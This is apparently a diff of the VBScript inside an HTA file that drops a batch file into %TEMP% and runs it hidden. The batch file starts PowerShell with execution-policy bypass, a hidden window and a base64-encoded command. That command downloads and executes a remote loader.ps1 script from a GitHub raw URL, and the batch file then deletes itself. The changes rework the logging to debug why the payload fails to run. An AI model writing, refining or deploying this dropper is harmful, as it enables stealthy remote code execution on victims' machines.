@@ -20,132 +20,116 @@
         Set sh = CreateObject("WScript.Shell")
         Set fso = CreateObject("Scripting.FileSystemObject")
         
-        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_detailed_debug.txt")
+        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_error_debug.txt")
         tempPath = sh.ExpandEnvironmentStrings("%TEMP%")
-        batPath = tempPath & "\run.bat"
+        batPath = tempPath & "\run_with_errors.bat"
         encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
         
-        ' Initialize debug log
-        Dim debugFile
-        Set debugFile = fso.CreateTextFile(debugPath, True)
-        debugFile.WriteLine "=== DETAILED DEBUG LOG ==="
-        debugFile.WriteLine "Start Time: " & Now()
-        debugFile.WriteLine "Temp Path: " & tempPath
-        debugFile.WriteLine "Batch Path: " & batPath
-        debugFile.WriteLine "Encoded Command Length: " & Len(encodedCmd)
-        debugFile.WriteLine "Encoded Command Preview: " & Left(encodedCmd, 50) & "..."
-        debugFile.WriteLine ""
-        debugFile.Close
-        
-        ' Step 1: Test basic file creation
-        LogStep "Step 1: Testing basic file creation"
-        Dim testFile
-        Set testFile = fso.CreateTextFile(tempPath & "\test.txt", True)
-        testFile.WriteLine "Test file created successfully"
-        testFile.Close
-        LogStep "Step 1: Basic file creation - SUCCESS"
-        
-        ' Step 2: Create batch file with detailed logging
-        LogStep "Step 2: Creating batch file"
+        ' Create batch file that captures PowerShell errors
         batContent = "@echo off" & vbCrLf & _
-                    "echo Batch file started > """ & tempPath & "\batch_log.txt""" & vbCrLf & _
-                    "echo Command: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & Left(encodedCmd, 30) & "... >> """ & tempPath & "\batch_log.txt""" & vbCrLf & _
-                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & vbCrLf & _
-                    "echo PowerShell command executed >> """ & tempPath & "\batch_log.txt""" & vbCrLf & _
-                    "timeout /t 5 /nobreak >nul" & vbCrLf & _
+                    "echo Starting PowerShell execution > """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "echo Command length: " & Len(encodedCmd) & " >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "echo Full command: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & " >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "echo. >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "echo === ATTEMPTING EXECUTION === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & " 2>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
+                    "echo PowerShell exit code: %ERRORLEVEL% >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "echo === TESTING BASIC POWERSHELL === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Write-Host 'Basic PowerShell works'"" >> """ & tempPath & "\ps_debug.txt""" & " 2>>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
+                    "echo === TESTING DECODED COMMAND === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "'))"" >> """ & tempPath & "\decoded_cmd.txt""" & " 2>>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
+                    "echo === TESTING NETWORK CONNECTIVITY === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Test-NetConnection -ComputerName google.com -Port 80"" >> """ & tempPath & "\network_test.txt""" & " 2>>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
+                    "echo All tests completed >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
+                    "timeout /t 10 /nobreak >nul" & vbCrLf & _
                     "del """ & batPath & """"
         
-        On Error Resume Next
+        ' Create and execute batch file
         Set batFile = fso.CreateTextFile(batPath, True)
-        If Err.Number <> 0 Then
-            LogStep "Step 2: ERROR creating batch file - " & Err.Description
-            Exit Sub
-        End If
         batFile.Write batContent
         batFile.Close
-        If Err.Number <> 0 Then
-            LogStep "Step 2: ERROR writing batch file - " & Err.Description
-            Exit Sub
-        End If
-        LogStep "Step 2: Batch file created - SUCCESS"
-        LogStep "Step 2: Batch file size: " & fso.GetFile(batPath).Size & " bytes"
-        On Error GoTo 0
         
-        ' Step 3: Verify batch file exists and is readable
-        LogStep "Step 3: Verifying batch file"
-        If fso.FileExists(batPath) Then
-            LogStep "Step 3: Batch file exists - SUCCESS"
-            Dim readBack
-            Set readBack = fso.OpenTextFile(batPath, 1)
-            LogStep "Step 3: Batch content preview: " & Left(readBack.ReadAll(), 100) & "..."
-            readBack.Close
-        Else
-            LogStep "Step 3: Batch file does NOT exist - FAILED"
-            Exit Sub
-        End If
+        ' Log what we're doing
+        Dim logFile
+        Set logFile = fso.CreateTextFile(debugPath, True)
+        logFile.WriteLine "=== ERROR CAPTURE DEBUG ==="
+        logFile.WriteLine "Time: " & Now()
+        logFile.WriteLine "Created batch file: " & batPath
+        logFile.WriteLine "Batch file size: " & fso.GetFile(batPath).Size & " bytes"
+        logFile.WriteLine "Executing batch file..."
+        logFile.Close
         
-        ' Step 4: Test different execution methods
-        LogStep "Step 4: Testing execution methods"
-        
-        ' Method A: Direct execution
-        LogStep "Step 4A: Direct execution"
+        ' Execute batch file
         sh.Run Chr(34) & batPath & Chr(34), 0, False
         
-        ' Method B: Through cmd.exe
-        LogStep "Step 4B: Through cmd.exe"
-        sh.Run "cmd.exe /c """ & batPath & """", 0, False
-        
-        ' Method C: Using start command
-        LogStep "Step 4C: Using start command"
-        sh.Run "cmd.exe /c start /min """ & batPath & """", 0, False
-        
-        ' Method D: Alternative PowerShell execution
-        LogStep "Step 4D: Alternative PowerShell execution"
-        Dim altCmd
-        altCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd
-        sh.Run altCmd, 0, False
-        
-        setTimeout "CheckResults", 8000
+        ' Check results after delay
+        setTimeout "CheckAllResults", 12000
     End Sub
     
-    Sub LogStep(message)
-        Dim fso, debugPath, debugFile
-        Set fso = CreateObject("Scripting.FileSystemObject")
-        debugPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\hta_detailed_debug.txt")
-        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
-        debugFile.WriteLine Now() & " - " & message
-        debugFile.Close
-    End Sub
-    
-    Sub CheckResults()
-        LogStep "Step 5: Checking results"
-        Dim fso, tempPath
+    Sub CheckAllResults()
+        Dim fso, tempPath, debugPath
         Set fso = CreateObject("Scripting.FileSystemObject")
         tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
+        debugPath = tempPath & "\hta_error_debug.txt"
         
-        ' Check if batch log was created
-        If fso.FileExists(tempPath & "\batch_log.txt") Then
-            LogStep "Step 5: Batch log found - batch file executed"
-            Dim batchLog
-            Set batchLog = fso.OpenTextFile(tempPath & "\batch_log.txt", 1)
-            LogStep "Step 5: Batch log content: " & batchLog.ReadAll()
-            batchLog.Close
+        Dim logFile
+        Set logFile = fso.OpenTextFile(debugPath, 8, True)
+        logFile.WriteLine ""
+        logFile.WriteLine "=== RESULTS ==="
+        logFile.WriteLine "Check time: " & Now()
+        
+        ' Check PowerShell debug log
+        If fso.FileExists(tempPath & "\ps_debug.txt") Then
+            logFile.WriteLine "PowerShell debug log found:"
+            Dim psDebug
+            Set psDebug = fso.OpenTextFile(tempPath & "\ps_debug.txt", 1)
+            logFile.WriteLine psDebug.ReadAll()
+            psDebug.Close
         Else
-            LogStep "Step 5: No batch log found - batch file may not have executed"
+            logFile.WriteLine "PowerShell debug log NOT found"
         End If
         
-        ' Check if batch file still exists
-        If fso.FileExists(tempPath & "\run.bat") Then
-            LogStep "Step 5: Batch file still exists - may indicate execution failure"
+        ' Check PowerShell errors
+        If fso.FileExists(tempPath & "\ps_errors.txt") Then
+            logFile.WriteLine ""
+            logFile.WriteLine "PowerShell errors found:"
+            Dim psErrors
+            Set psErrors = fso.OpenTextFile(tempPath & "\ps_errors.txt", 1)
+            logFile.WriteLine psErrors.ReadAll()
+            psErrors.Close
         Else
-            LogStep "Step 5: Batch file was deleted - indicates successful execution"
+            logFile.WriteLine "No PowerShell errors file found"
         End If
         
+        ' Check decoded command
+        If fso.FileExists(tempPath & "\decoded_cmd.txt") Then
+            logFile.WriteLine ""
+            logFile.WriteLine "Decoded command:"
+            Dim decoded
+            Set decoded = fso.OpenTextFile(tempPath & "\decoded_cmd.txt", 1)
+            logFile.WriteLine decoded.ReadAll()
+            decoded.Close
+        Else
+            logFile.WriteLine "Decoded command file NOT found"
+        End If
+        
+        ' Check network test
+        If fso.FileExists(tempPath & "\network_test.txt") Then
+            logFile.WriteLine ""
+            logFile.WriteLine "Network test results:"
+            Dim netTest
+            Set netTest = fso.OpenTextFile(tempPath & "\network_test.txt", 1)
+            logFile.WriteLine netTest.ReadAll()
+            netTest.Close
+        Else
+            logFile.WriteLine "Network test file NOT found"
+        End If
+        
+        logFile.Close
         setTimeout "CleanupAndExit", 2000
     End Sub
     
     Sub CleanupAndExit()
-        LogStep "Step 6: HTA closing"
         self.close
     End Sub
   </script>
